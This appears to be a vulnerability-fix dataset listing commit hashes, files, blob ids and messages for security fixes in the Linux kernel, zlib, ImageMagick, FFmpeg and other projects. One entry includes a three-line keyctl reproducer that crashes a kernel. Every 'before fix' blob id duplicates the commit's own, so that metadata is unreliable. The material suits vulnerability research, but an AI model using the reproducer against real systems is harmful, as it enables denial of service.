ALSA: pcm : Call kill_fasync() in stream lock\n\nCurrently kill_fasync() is called outside the stream lock in snd_pcm_period_elapsed().  This is potentially racy, since the stream may get released even during the irq handler is running.  Although snd_pcm_release_substream() calls snd_pcm_drop(), this doesn't guarantee that the irq handler finishes, thus the kill_fasync() call outside the stream spin lock may be invoked after the substream is detached, as recently reported by KASAN.\n\nAs a quick workaround, move kill_fasync() call inside the stream lock.  The fasync is rarely used interface, so this shouldn't have a big impact from the performance POV.\n\nIdeally, we should implement some sync mechanism for the proper finish of stream and irq handler.  But this oneliner should suffice for most cases, so far.\n\nReported-by: Baozeng Ding <sploving1@gmail.com> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    92964c79b357efd980812c4de5c1fd2ec8bb5520
File(s) In Commit: 
    net/netlink/af_netlink.c
Blob(s) In Commit: 
    627f898c05b96552318a881ce995ccc3342e1576
Blob(s) Before Fix: 
    627f898c05b96552318a881ce995ccc3342e1576
Projects:
    0-T-0_ps4-linux
Commit Message for 92964c79b357efd980812c4de5c1fd2ec8bb5520:
netlink: Fix dump skb leak/double free\n\nWhen we free cb->skb after a dump, we do it after releasing the lock.  This means that a new dump could have started in the time being and we'll end up freeing their skb instead of ours.\n\nThis patch saves the skb and module before we unlock so we free the right memory.\n\nFixes: 16b304f3404f ("netlink: Eliminate kmalloc in netlink dump operation.") Reported-by: Baozeng Ding <sploving1@gmail.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Acked-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    6a043145ca6e9c55184013841a67b2fef87e44c0
File(s) In Commit: 
    inftrees.c
Blob(s) In Commit: 
    0d2670d57c8cbe70d4bd8586f193d0608dd14749
Blob(s) Before Fix: 
    0d2670d57c8cbe70d4bd8586f193d0608dd14749
Projects:
    0xXA_lk
Commit Message for 6a043145ca6e9c55184013841a67b2fef87e44c0:
Remove offset pointer optimization in inftrees.c.\n\ninftrees.c was subtracting an offset from a pointer to an array, in order to provide a pointer that allowed indexing starting at the offset. This is not compliant with the C standard, for which the behavior of a pointer decremented before its allocated memory is undefined. Per the recommendation of a security audit of the zlib code by Trail of Bits and TrustInSoft, in support of the Mozilla Foundation, this tiny optimization was removed, in order to avoid the possibility of undefined behavior.

======================================================================
Commit With Fix: 
    9aaec95e82117c1cb0f9624264c3618fc380cecb
File(s) In Commit: 
    inffast.c
Blob(s) In Commit: 
    f0d163db805fa8cd265547ce95181cc2e279343a
Blob(s) Before Fix: 
    f0d163db805fa8cd265547ce95181cc2e279343a
Projects:
    0xXA_lk
Commit Message for 9aaec95e82117c1cb0f9624264c3618fc380cecb:
Use post-increment only in inffast.c.\n\nAn old inffast.c optimization turns out to not be optimal anymore with modern compilers, and furthermore was not compliant with the C standard, for which decrementing a pointer before its allocated memory is undefined. Per the recommendation of a security audit of the zlib code by Trail of Bits and TrustInSoft, in support of the Mozilla Foundation, this "optimization" was removed, in order to avoid the possibility of undefined behavior.

======================================================================
Commit With Fix: 
    e54e1299404101a5a9d0cf5e45512b543967f958
File(s) In Commit: 
    inflate.c
Blob(s) In Commit: 
    a71841670eff6476d3b86a49dcf91acdf2e7bb3f
Blob(s) Before Fix: 
    a71841670eff6476d3b86a49dcf91acdf2e7bb3f
Projects:
    0xXA_lk
Commit Message for e54e1299404101a5a9d0cf5e45512b543967f958:
Avoid shifts of negative values inflateMark().\n\nThe C standard says that bit shifts of negative integers is undefined.  This casts to unsigned values to assure a known result.

======================================================================
Commit With Fix: 
    d1d577490c15a0c6862473d7576352a9f18ef811
File(s) In Commit: 
    crc32.c
Blob(s) In Commit: 
    05733f4e407580307a53317978beba2281c006d1
Blob(s) Before Fix: 
    05733f4e407580307a53317978beba2281c006d1
Projects:
    0xXA_lk
Commit Message for d1d577490c15a0c6862473d7576352a9f18ef811:
Avoid pre-decrement of pointer in big-endian CRC calculation.\n\nThere was a small optimization for PowerPCs to pre-increment a pointer when accessing a word, instead of post-incrementing. This required prefacing the loop with a decrement of the pointer, possibly pointing before the object passed. This is not compliant with the C standard, for which decrementing a pointer before its allocated memory is undefined. When tested on a modern PowerPC with a modern compiler, the optimization no longer has any effect. Due to all that, and per the recommendation of a security audit of the zlib code by Trail of Bits and TrustInSoft, in support of the Mozilla Foundation, this "optimization" was removed, in order to avoid the possibility of undefined behavior.

======================================================================
Commit With Fix: 
    79dc7e3f1cd323be4c81aa1a94faa1b3ed987fb2
File(s) In Commit: 
    net/ipv6/icmp.c
Blob(s) In Commit: 
    2772004ba5a18848bd818434951fb10d758be90d
Blob(s) Before Fix: 
    2772004ba5a18848bd818434951fb10d758be90d
Projects:
    0-T-0_ps4-linux
Commit Message for 79dc7e3f1cd323be4c81aa1a94faa1b3ed987fb2:
net: handle no dst on skb in icmp6_send\n\nAndrey reported the following while fuzzing the kernel with syzkaller:\n\nkasan: CONFIG_KASAN_INLINE enabled kasan: GPF could be caused by NULL-ptr deref or user memory access general protection fault: 0000 [#1] SMP KASAN Modules linked in: CPU: 0 PID: 3859 Comm: a.out Not tainted 4.9.0-rc6+ #429 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011 task: ffff8800666d4200 task.stack: ffff880067348000 RIP: 0010:[<ffffffff833617ec>]  [<ffffffff833617ec>] icmp6_send+0x5fc/0x1e30 net/ipv6/icmp.c:451 RSP: 0018:ffff88006734f2c0  EFLAGS: 00010206 RAX: ffff8800666d4200 RBX: 0000000000000000 RCX: 0000000000000000 RDX: 0000000000000000 RSI: dffffc0000000000 RDI: 0000000000000018 RBP: ffff88006734f630 R08: ffff880064138418 R09: 0000000000000003 R10: dffffc0000000000 R11: 0000000000000005 R12: 0000000000000000 R13: ffffffff84e7e200 R14: ffff880064138484 R15: ffff8800641383c0 FS:  00007fb3887a07c0(0000) GS:ffff88006cc00000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 0000000020000000 CR3: 000000006b040000 CR4: 00000000000006f0 Stack:  ffff8800666d4200 ffff8800666d49f8 ffff8800666d4200 ffffffff84c02460  ffff8800666d4a1a 1ffff1000ccdaa2f ffff88006734f498 0000000000000046  ffff88006734f440 ffffffff832f4269 ffff880064ba7456 0000000000000000 Call Trace:  [<ffffffff83364ddc>] icmpv6_param_prob+0x2c/0x40 net/ipv6/icmp.c:557  [<     inline     >] ip6_tlvopt_unknown net/ipv6/exthdrs.c:88  [<ffffffff83394405>] ip6_parse_tlv+0x555/0x670 net/ipv6/exthdrs.c:157  [<ffffffff8339a759>] ipv6_parse_hopopts+0x199/0x460 net/ipv6/exthdrs.c:663  [<ffffffff832ee773>] ipv6_rcv+0xfa3/0x1dc0 net/ipv6/ip6_input.c:191  ...\n\nicmp6_send / icmpv6_send is invoked for both rx and tx paths. In both cases the dst->dev should be preferred for determining the L3 domain if the dst has been set on the skb. Fallback to the skb->dev if it has not. This covers the case reported here where icmp6_send is invoked on Rx before the route lookup.\n\nFixes: 5d41ce29e ("net: icmp6_send should use dst dev to determine L3 domain") Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David Ahern <dsa@cumulusnetworks.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    049c74699ce93cf126feff06d632ea63fba36742
File(s) In Commit: 
    recurly/resource.py
Blob(s) In Commit: 
    b0d214ae74c5e91fb152f9f50d425bf1eacd6299
Blob(s) Before Fix: 
    b0d214ae74c5e91fb152f9f50d425bf1eacd6299
Projects:
    15five_recurly-client-python
Commit Message for 049c74699ce93cf126feff06d632ea63fba36742:
Fix SSRF: do not use urljoin, quote uuids

======================================================================
Commit With Fix: 
    88ccff152604e0f1012653a596d802ff7ede3145
File(s) In Commit: 
    net/rootd/src/rootd.cxx
Blob(s) In Commit: 
    56bbeec29164a4d77923c17618d617c266004f54
Blob(s) Before Fix: 
    56bbeec29164a4d77923c17618d617c266004f54
Projects:
    540KJ_root
Commit Message for 88ccff152604e0f1012653a596d802ff7ede3145:
rootd: do not use popen() to expand path names (#513)\n\nAddressed security threat reported by S. Luders.  Using the same technology used in TSystem::ExpandFileName (with clang-format processing).

======================================================================
Commit With Fix: 
    35c94dc6acc418f1ad7f6241a6680e5327495793
File(s) In Commit: 
    src/readelf.c
Blob(s) In Commit: 
    5f425c974e762421f6b91aecf1fff184c1901185
Blob(s) Before Fix: 
    5f425c974e762421f6b91aecf1fff184c1901185
Projects:
    5hadowblad3_file
Commit Message for 35c94dc6acc418f1ad7f6241a6680e5327495793:
Fix always true condition (Thomas Jarosch)

======================================================================
Commit With Fix: 
    b4e458612d4294e0cfe01dbf1c0b09a07a8133a4
File(s) In Commit: 
    JfifDecode.cpp
Blob(s) In Commit: 
    8026496529b29018a4150f1b87a82d9fa89cf0a4
Blob(s) Before Fix: 
    8026496529b29018a4150f1b87a82d9fa89cf0a4
Projects:
    alggm_JPEGsnoop
Commit Message for b4e458612d4294e0cfe01dbf1c0b09a07a8133a4:
Fixed div0 vulnerability in SampFact

======================================================================
Commit With Fix: 
    a2ed226637f8e66c9b089784b5e58eccf2e2fb30
File(s) In Commit: 
    public/js/app/note.js
Blob(s) In Commit: 
    e7ea05cd19e4d9f9af90d8a58df73e50a3694161
Blob(s) Before Fix: 
    e7ea05cd19e4d9f9af90d8a58df73e50a3694161
Projects:
    0326_desktop-app
Commit Message for a2ed226637f8e66c9b089784b5e58eccf2e2fb30:
Starred notes XXS

======================================================================
Commit With Fix: 
    7aeb624b44f86d335841242ff427433190e7168a
File(s) In Commit: 
    miniupnpc/upnpreplyparse.c
    miniupnpd/upnpreplyparse.c
Blob(s) In Commit: 
    ae84b0bac860983a25820e39cc8d5807734f5034
Blob(s) Before Fix: 
    ae84b0bac860983a25820e39cc8d5807734f5034
Projects:
    007jasonsmith_Catch
Commit Message for 7aeb624b44f86d335841242ff427433190e7168a:
properly initialize data structure for SOAP parsing in ParseNameValue()\n\ntopelt field was not properly initialized.\n\nshould fix #268

======================================================================
Commit With Fix: 
    1e38da300e1e395a15048b0af1e5305bd91402f6
File(s) In Commit: 
    fs/timerfd.c
Blob(s) In Commit: 
    384fa759a563341b309df47537f9c94da0ee9ebb
Blob(s) Before Fix: 
    384fa759a563341b309df47537f9c94da0ee9ebb
Projects:
    0-T-0_ps4-linux
Commit Message for 1e38da300e1e395a15048b0af1e5305bd91402f6:
timerfd: Protect the might cancel mechanism proper\n\nThe handling of the might_cancel queueing is not properly protected, so parallel operations on the file descriptor can race with each other and lead to list corruptions or use after free.\n\nProtect the context for these operations with a seperate lock.\n\nThe wait queue lock cannot be reused for this because that would create a lock inversion scenario vs. the cancel lock. Replacing might_cancel with an atomic (atomic_t or atomic bit) does not help either because it still can race vs. the actual list operation.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Cc: "linux-fsdevel@vger.kernel.org" Cc: syzkaller <syzkaller@googlegroups.com> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: linux-fsdevel@vger.kernel.org Link: http://lkml.kernel.org/r/alpine.DEB.2.20.1701311521430.3457@nanos Signed-off-by: Thomas Gleixner <tglx@linutronix.de>\n\n

======================================================================
Commit With Fix: 
    15d3042a937c13f5d9244241c7a9c8416ff6e82a
File(s) In Commit: 
    fs/f2fs/super.c
Blob(s) In Commit: 
    397b1e816b3696b8d5bb992d2b8d3a8a031ee548
Blob(s) Before Fix: 
    397b1e816b3696b8d5bb992d2b8d3a8a031ee548
Projects:
    0-T-0_ps4-linux
Commit Message for 15d3042a937c13f5d9244241c7a9c8416ff6e82a:
f2fs: sanity check checkpoint segno and blkoff\n\nMake sure segno and blkoff read from raw image are valid.\n\nCc: stable@vger.kernel.org Signed-off-by: Jin Qian <jinqian@google.com> [Jaegeuk Kim: adjust minor coding style] Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>

======================================================================
Commit With Fix: 
    3dd6812412289a199564e63fffd0a9754010b9e0
File(s) In Commit: 
    admin/cat_options.php
Blob(s) In Commit: 
    5fd4d04ce17b02eeaa695e7dfe3f66fc9237f2be
Blob(s) Before Fix: 
    5fd4d04ce17b02eeaa695e7dfe3f66fc9237f2be
Projects:
    7tonin_Piwigo
Commit Message for 3dd6812412289a199564e63fffd0a9754010b9e0:
check input parameter for cat_options pages\n\nsolving https://github.com/Piwigo/Piwigo/issues/724

======================================================================
Commit With Fix: 
    385aee965b4e4c36551c362a334378d2985b722a
File(s) In Commit: 
    drivers/gpu/drm/virtio/virtgpu_object.c
Blob(s) In Commit: 
    6f66b7347cd0d68c1257170e3521bbdd100bbaea
Blob(s) Before Fix: 
    6f66b7347cd0d68c1257170e3521bbdd100bbaea
Projects:
    0-T-0_ps4-linux
Commit Message for 385aee965b4e4c36551c362a334378d2985b722a:
drm/virtio: don't leak bo on drm_gem_object_init failure\n\nReported-by: 李强 <liqiang6-s@360.cn> Signed-off-by: Gerd Hoffmann <kraxel@redhat.com> Link: http://patchwork.freedesktop.org/patch/msgid/20170406155941.458-1-kraxel@redhat.com

======================================================================
Commit With Fix: 
    c57997e76ec70862174a1b3b3aeb62a6f8570e85
File(s) In Commit: 
    shlr/grub/kern/disk.c
Blob(s) In Commit: 
    f93116854c6227bca2e3485846ff1b0ba73aec72
Blob(s) Before Fix: 
    f93116854c6227bca2e3485846ff1b0ba73aec72
Projects:
    0-T-0_radare2
Commit Message for c57997e76ec70862174a1b3b3aeb62a6f8570e85:
Fix r2_hbo_grub_memmove ext2 crash

======================================================================
Commit With Fix: 
    f991af3daabaecff34684fd51fac80319d1baad1
File(s) In Commit: 
    ipc/mqueue.c
Blob(s) In Commit: 
    eb1391b52c6f84fe75dec4e8366d858341ac665a
Blob(s) Before Fix: 
    eb1391b52c6f84fe75dec4e8366d858341ac665a
Projects:
    0-T-0_ps4-linux
Commit Message for f991af3daabaecff34684fd51fac80319d1baad1:
mqueue: fix a use-after-free in sys_mq_notify()\n\nThe retry logic for netlink_attachskb() inside sys_mq_notify() is nasty and vulnerable:\n\n1) The sock refcnt is already released when retry is needed 2) The fd is controllable by user-space because we already    release the file refcnt\n\nso we when retry but the fd has been just closed by user-space during this small window, we end up calling netlink_detachskb() on the error path which releases the sock again, later when the user-space closes this socket a use-after-free could be triggered.\n\nSetting 'sock' to NULL here should be sufficient to fix it.\n\nReported-by: GeneBlue <geneblue.mail@gmail.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Manfred Spraul <manfred@colorfullife.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    ba4beaf6149f7241c8bd85fe853318c2f6837ad0
File(s) In Commit: 
    libavcodec/apedec.c
Blob(s) In Commit: 
    15eb416ba4ea9b226c0f86907b76c312b5586ef3
Blob(s) Before Fix: 
    15eb416ba4ea9b226c0f86907b76c312b5586ef3
Projects:
    00ERNEST00_FFmpeg
Commit Message for ba4beaf6149f7241c8bd85fe853318c2f6837ad0:
avcodec/apedec: Fix integer overflow\n\nFixes: out of array access Fixes: PoC.ape and others\n\nFound-by: Bingchang, Liu@VARAS of IIE Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    72a50e400d98d7a2fd610caedfeb9af043dc5582
File(s) In Commit: 
    coders/screenshot.c
Blob(s) In Commit: 
    e2e6d8605acc09bbb03dd27db1f2b7abdb553e6a
Blob(s) Before Fix: 
    e2e6d8605acc09bbb03dd27db1f2b7abdb553e6a
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 72a50e400d98d7a2fd610caedfeb9af043dc5582:
Fixed potential memory leak.

======================================================================
Commit With Fix: 
    f6463ca9588579633bbaed9460899d892aa3c64a
File(s) In Commit: 
    coders/jpeg.c
Blob(s) In Commit: 
    c3a813a6e593f8d3f0e9cbeda398089a388369c2
Blob(s) Before Fix: 
    c3a813a6e593f8d3f0e9cbeda398089a388369c2
Projects:
    2016repotsheyue_ImageMagick
Commit Message for f6463ca9588579633bbaed9460899d892aa3c64a:
Zero pixel buffer

======================================================================
Commit With Fix: 
    948356eec65aea91995d4b7cc487d197d2c5f602
File(s) In Commit: 
    coders/jpeg.c
Blob(s) In Commit: 
    9b94e7252cd7142a8790f90713bf50ecdc9475ad
Blob(s) Before Fix: 
    9b94e7252cd7142a8790f90713bf50ecdc9475ad
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 948356eec65aea91995d4b7cc487d197d2c5f602:
...

======================================================================
Commit With Fix: 
    ecf9267a24b2c3c0cd211dbdfa9ef2232511972a
File(s) In Commit: 
    rsvg-filter.c
Blob(s) In Commit: 
    804d6375f513908d5375ff2b44c89462464b421d
Blob(s) Before Fix: 
    804d6375f513908d5375ff2b44c89462464b421d
Projects:
    GNOME_librsvg
Commit Message for ecf9267a24b2c3c0cd211dbdfa9ef2232511972a:
bgo#783835 - Don't divide by zero in box_blur_line() for gaussian blurs\n\nWe were making the decision to use box blurs, instead of a true Gaussian kernel, based on the size of *both* x and y dimensions.  Do them individually instead.

======================================================================
Commit With Fix: 
    816ecab6c532ae086ff4186b3eaf4aa7092d536f
File(s) In Commit: 
    coders/png.c
Blob(s) In Commit: 
    c61b6874e7ad5c817a732bece839eae339bc03a7
Blob(s) Before Fix: 
    c61b6874e7ad5c817a732bece839eae339bc03a7
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 816ecab6c532ae086ff4186b3eaf4aa7092d536f:
https://github.com/ImageMagick/ImageMagick/issues/58

======================================================================
Commit With Fix: 
    63973f71e337ead8ca7b7ae2a043b837032dc3fe
File(s) In Commit: 
    angular/core/config/marked.coffee
    angular/core/services/render_service.coffee
Blob(s) In Commit: 
    e59e59b7559f2c18dd8cb12d2e78713171a16f7f
Blob(s) Before Fix: 
    e59e59b7559f2c18dd8cb12d2e78713171a16f7f
Projects:
    07fi123_loomio
Commit Message for 63973f71e337ead8ca7b7ae2a043b837032dc3fe:
Ensure existing marked renderer code runs with customization (#4078)\n\n* Ensure existing marked renderer code runs with customization    * Use noopener / noreferrer for marked links

======================================================================
Commit With Fix: 
    296debd213bd6dce7647cedd34eb64e5b94cdc92
File(s) In Commit: 
    libavcodec/dnxhddec.c
Blob(s) In Commit: 
    f46e41a4562393328c6ef14012df6bbf1bc75689
Blob(s) Before Fix: 
    f46e41a4562393328c6ef14012df6bbf1bc75689
Projects:
    00ERNEST00_FFmpeg
Commit Message for 296debd213bd6dce7647cedd34eb64e5b94cdc92:
avcodec/dnxhddec: Move mb height check out of non hr branch\n\nFixes: out of array access Fixes: poc.dnxhd\n\nFound-by: Bingchang, Liu@VARAS of IIE Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    9b5b71dadbeeeec27efea59f562ac5bd6d2673b7
File(s) In Commit: 
    manage_user_page.php
Blob(s) In Commit: 
    2d6917e3daa448d217513955359b4007ea35e572
Blob(s) Before Fix: 
    2d6917e3daa448d217513955359b4007ea35e572
Projects:
    01-Scripts_mantisbt
Commit Message for 9b5b71dadbeeeec27efea59f562ac5bd6d2673b7:
Fix XSS in manage_user_page.php (CVE-2017-12062)\n\ntrichimtrich (https://twitter.com/trichimtrich) reported this vulnerability, allowing an attacker to inject arbitrary code through a crafted 'filter' form variable.\n\nPrevent the attack by sanitizing the variable before output.\n\nFixes #23166\n\nSigned-off-by: Damien Regad <dregad@mantisbt.org>

======================================================================
Commit With Fix: 
    6265539776a0810b7ce6398c27866ddb9c6bd154
File(s) In Commit: 
    drivers/base/platform.c
Blob(s) In Commit: 
    97332d094fe23a7d6e6ad463bcc2262e1313d46c
Blob(s) Before Fix: 
    97332d094fe23a7d6e6ad463bcc2262e1313d46c
Projects:
    0-T-0_ps4-linux
Commit Message for 6265539776a0810b7ce6398c27866ddb9c6bd154:
driver core: platform: fix race condition with driver_override\n\nThe driver_override implementation is susceptible to race condition when different threads are reading vs storing a different driver override. Add locking to avoid race condition.\n\nFixes: 3d713e0e382e ("driver core: platform: add device binding path 'driver_override'") Cc: stable@vger.kernel.org Signed-off-by: Adrian Salido <salidoa@google.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    51aa68e7d57e3217192d88ce90fd5b8ef29ec94f
File(s) In Commit: 
    arch/x86/kvm/vmx.c
Blob(s) In Commit: 
    8e1ae716f9389b5cd46f6333982f3312c3f670b1
Blob(s) Before Fix: 
    8e1ae716f9389b5cd46f6333982f3312c3f670b1
Projects:
    0-T-0_ps4-linux
Commit Message for 51aa68e7d57e3217192d88ce90fd5b8ef29ec94f:
kvm: nVMX: Don't allow L2 to access the hardware CR8\n\nIf L1 does not specify the "use TPR shadow" VM-execution control in vmcs12, then L0 must specify the "CR8-load exiting" and "CR8-store exiting" VM-execution controls in vmcs02. Failure to do so will give the L2 VM unrestricted read/write access to the hardware CR8.\n\nThis fixes CVE-2017-12154.\n\nSigned-off-by: Jim Mattson <jmattson@google.com> Reviewed-by: David Hildenbrand <david@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    9e3f7a29694049edd728e2400ab57ad7553e5aa9
File(s) In Commit: 
    arch/arm64/kvm/sys_regs.c
Blob(s) In Commit: 
    87e7e6608cd8a31e6913be8134b90e443df314cb
Blob(s) Before Fix: 
    87e7e6608cd8a31e6913be8134b90e443df314cb
Projects:
    0-T-0_ps4-linux
Commit Message for 9e3f7a29694049edd728e2400ab57ad7553e5aa9:
arm64: KVM: pmu: Fix AArch32 cycle counter access\n\nWe're missing the handling code for the cycle counter accessed from a 32bit guest, leading to unexpected results.\n\nCc: stable@vger.kernel.org # 4.6+ Signed-off-by: Wei Huang <wei@redhat.com> Signed-off-by: Marc Zyngier <marc.zyngier@arm.com>

======================================================================
Commit With Fix: 
    37863c43b2c6464f252862bf2e9768264e961678
File(s) In Commit: 
    security/keys/keyctl.c
Blob(s) In Commit: 
    365ff85d7e27122db220fad6d633f8e0b352209f
Blob(s) Before Fix: 
    365ff85d7e27122db220fad6d633f8e0b352209f
Projects:
    0-T-0_ps4-linux
Commit Message for 37863c43b2c6464f252862bf2e9768264e961678:
KEYS: prevent KEYCTL_READ on negative key\n\nBecause keyctl_read_key() looks up the key with no permissions requested, it may find a negatively instantiated key.  If the key is also possessed, we went ahead and called ->read() on the key.  But the key payload will actually contain the ->reject_error rather than the normal payload.  Thus, the kernel oopses trying to read the user_key_payload from memory address (int)-ENOKEY = 0x00000000ffffff82.\n\nFortunately the payload data is stored inline, so it shouldn't be possible to abuse this as an arbitrary memory read primitive...\n\nReproducer:     keyctl new_session     keyctl request2 user desc '' @s     keyctl read $(keyctl show | awk '/user: desc/ {print $1}')\n\nIt causes a crash like the following:      BUG: unable to handle kernel paging request at 00000000ffffff92      IP: user_read+0x33/0xa0      PGD 36a54067 P4D 36a54067 PUD 0      Oops: 0000 [#1] SMP      CPU: 0 PID: 211 Comm: keyctl Not tainted 4.14.0-rc1 #337      Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-20170228_101828-anatol 04/01/2014      task: ffff90aa3b74c3c0 task.stack: ffff9878c0478000      RIP: 0010:user_read+0x33/0xa0      RSP: 0018:ffff9878c047bee8 EFLAGS: 00010246      RAX: 0000000000000001 RBX: ffff90aa3d7da340 RCX: 0000000000000017      RDX: 0000000000000000 RSI: 00000000ffffff82 RDI: ffff90aa3d7da340      RBP: ffff9878c047bf00 R08: 00000024f95da94f R09: 0000000000000000      R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000000      R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000      FS:  00007f58ece69740(0000) GS:ffff90aa3e200000(0000) knlGS:0000000000000000      CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033      CR2: 00000000ffffff92 CR3: 0000000036adc001 CR4: 00000000003606f0      Call Trace:       keyctl_read_key+0xac/0xe0       SyS_keyctl+0x99/0x120       entry_SYSCALL_64_fastpath+0x1f/0xbe      RIP: 0033:0x7f58ec787bb9      RSP: 002b:00007ffc8d401678 EFLAGS: 00000206 ORIG_RAX: 00000000000000fa      RAX: ffffffffffffffda RBX: 00007ffc8d402800 RCX: 00007f58ec787bb9      RDX: 0000000000000000 RSI: 00000000174a63ac RDI: 000000000000000b      RBP: 0000000000000004 R08: 00007ffc8d402809 R09: 0000000000000020      R10: 0000000000000000 R11: 0000000000000206 R12: 00007ffc8d402800      R13: 00007ffc8d4016e0 R14: 0000000000000000 R15: 0000000000000000      Code: e5 41 55 49 89 f5 41 54 49 89 d4 53 48 89 fb e8 a4 b4 ad ff 85 c0 74 09 80 3d b9 4c 96 00 00 74 43 48 8b b3 20 01 00 00 4d 85 ed <0f> b7 5e 10 74 29 4d 85 e4 74 24 4c 39 e3 4c 89 e2 4c 89 ef 48      RIP: user_read+0x33/0xa0 RSP: ffff9878c047bee8      CR2: 00000000ffffff92\n\nFixes: 61ea0c0ba904 ("KEYS: Skip key state checks when checking for possession") Cc: <stable@vger.kernel.org>	[v3.13+] Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com>

======================================================================
Commit With Fix: 
    ea6789980fdaa610d7eb63602c746bf6ec70cd2b
File(s) In Commit: 
    lib/assoc_array.c
Blob(s) In Commit: 
    4e53be8bc590dc2030a930aec5a2cac8c4fa6a30
Blob(s) Before Fix: 
    4e53be8bc590dc2030a930aec5a2cac8c4fa6a30
Projects:
    0-T-0_ps4-linux
Commit Message for ea6789980fdaa610d7eb63602c746bf6ec70cd2b:
assoc_array: Fix a buggy node-splitting case\n\nThis fixes CVE-2017-12193.\n\nFix a case in the assoc_array implementation in which a new leaf is added that needs to go into a node that happens to be full, where the existing leaves in that node cluster together at that level to the exclusion of new leaf.\n\nWhat needs to happen is that the existing leaves get moved out to a new node, N1, at level + 1 and the existing node needs replacing with one, N0, that has pointers to the new leaf and to N1.\n\nThe code that tries to do this gets this wrong in two ways:\n\n (1) The pointer that should've pointed from N0 to N1 is set to point      recursively to N0 instead.\n\n (2) The backpointer from N0 needs to be set correctly in the case N0 is      either the root node or reached through a shortcut.\n\nFix this by removing this path and using the split_node path instead, which achieves the same end, but in a more general way (thanks to Eric Biggers for spotting the redundancy).\n\nThe problem manifests itself as:\n\n  BUG: unable to handle kernel NULL pointer dereference at 0000000000000010   IP: assoc_array_apply_edit+0x59/0xe5\n\nFixes: 3cb989501c26 ("Add a generic associative array implementation.") Reported-and-tested-by: WU Fan <u3536072@connect.hku.hk> Signed-off-by: David Howells <dhowells@redhat.com> Cc: stable@vger.kernel.org [v3.13-rc1+] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    954e3d2e7113e9ac06632aee3c69b8d818cc8952
File(s) In Commit: 
    lib/commonio.c
Blob(s) In Commit: 
    31edbaaf31b918205a811a7e5c13b2f8d281d375
Blob(s) Before Fix: 
    31edbaaf31b918205a811a7e5c13b2f8d281d375
Projects:
    AdamMajer_shadow
Commit Message for 954e3d2e7113e9ac06632aee3c69b8d818cc8952:
Fix buffer overflow if NULL line is present in db.\n\nIf ptr->line == NULL for an entry, the first cycle will exit, but the second one will happily write past entries buffer. We actually do not want to exit the first cycle prematurely on ptr->line == NULL. Signed-off-by: Tomas Mraz <tmraz@fedoraproject.org>

======================================================================
Commit With Fix: 
    307fa45d512641fcd105f0d57ca50c1437cd1b81
File(s) In Commit: 
    coders/png.c
Blob(s) In Commit: 
    860d28ec41c005f2e7ee8610ec4137d46a3f93b2
Blob(s) Before Fix: 
    860d28ec41c005f2e7ee8610ec4137d46a3f93b2
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 307fa45d512641fcd105f0d57ca50c1437cd1b81:
https://github.com/ImageMagick/ImageMagick/issues/542

======================================================================
Commit With Fix: 
    c9aa9f80828594eacbe3affe16c43d623562e5d8
File(s) In Commit: 
    coders/png.c
Blob(s) In Commit: 
    080709c047c4fa1c5770c730a45e10e6618784fe
Blob(s) Before Fix: 
    080709c047c4fa1c5770c730a45e10e6618784fe
Projects:
    2016repotsheyue_ImageMagick
Commit Message for c9aa9f80828594eacbe3affe16c43d623562e5d8:
https://github.com/ImageMagick/ImageMagick/issues/550

======================================================================
Commit With Fix: 
    d9ccd8227c4c88a907cda5278408b73552cb0c07
File(s) In Commit: 
    coders/png.c
Blob(s) In Commit: 
    dc8be52207470e8619bfd6295ee0c1f8876dc115
Blob(s) Before Fix: 
    dc8be52207470e8619bfd6295ee0c1f8876dc115
Projects:
    2016repotsheyue_ImageMagick
Commit Message for d9ccd8227c4c88a907cda5278408b73552cb0c07:
https://github.com/ImageMagick/ImageMagick/issues/549

======================================================================
Commit With Fix: 
    a33f7498f9052b50e8fe8c8422a11ba84474cb42
File(s) In Commit: 
    coders/dcm.c
Blob(s) In Commit: 
    55377c4f9cc1ffe20f14809c6e04d8d7e21531c2
Blob(s) Before Fix: 
    55377c4f9cc1ffe20f14809c6e04d8d7e21531c2
Projects:
    2016repotsheyue_ImageMagick
Commit Message for a33f7498f9052b50e8fe8c8422a11ba84474cb42:
https://github.com/ImageMagick/ImageMagick/issues/551

======================================================================
Commit With Fix: 
    cb9f07d9dcd791b63e622da43f7b232adaec0a9a
File(s) In Commit: 
    taglib/mpeg/id3v2/id3v2framefactory.cpp
Blob(s) In Commit: 
    9347ab86972a32ea31229dfd719f8a4f0cd84947
Blob(s) Before Fix: 
    9347ab86972a32ea31229dfd719f8a4f0cd84947
Projects:
    121340129_taglib
